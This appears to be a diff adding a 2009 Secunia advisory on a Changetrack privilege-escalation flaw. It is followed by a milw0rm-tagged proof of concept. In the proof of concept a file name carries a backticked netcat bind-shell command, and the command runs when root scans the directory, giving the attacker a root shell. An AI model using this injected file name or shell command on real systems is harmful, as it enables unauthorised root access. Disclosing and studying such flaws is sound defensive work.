@@ -1,0 +1,57 @@
+TITLE:
+Changetrack Privilege Escalation Vulnerability
+
+SECUNIA ADVISORY ID:
+SA36756
+
+VERIFY ADVISORY:
+http://secunia.com/advisories/36756/
+
+DESCRIPTION:
+A vulnerability has been discovered in Changetrack, which can be
+exploited by malicious, local users to gain escalated privileges.
+
+The application does not properly escape certain file names, which
+can be exploited to inject and execute arbitrary shell commands
+(potentially with "root" privileges) by creating a maliciously named
+file in a directory tracked by Changetrack.
+
+Successful exploitation requires write privileges to a directory
+scanned by Changetrack.
+
+SOLUTION:
+Use Changetrack to track trusted directories only.
+
+PROVIDED AND/OR DISCOVERED BY:
+Marek Grzybowski
+
+
+--------------------------------------------------------------------------------
+Example of exploitation:
+
+------------ Attacker ----------
+
+rick@testmachine:~/testt$ touch "<\`nc -l -p 5001 -e \$SHELL\`"
+rick@testmachine:~/testt$ ls
+<`nc -l -p 5001 -e $SHELL`
+
+--------------------------------
+
+
+------------ root --------------
+
+testmachine:~# changetrack 
+
+------------ root --------------
+
+
+
+------------ Attacker ----------
+
+rick@testmachine:~/testt$ nc 127.0.0.1 5001
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+--------------------------------
+
+# milw0rm.com [2009-09-17]
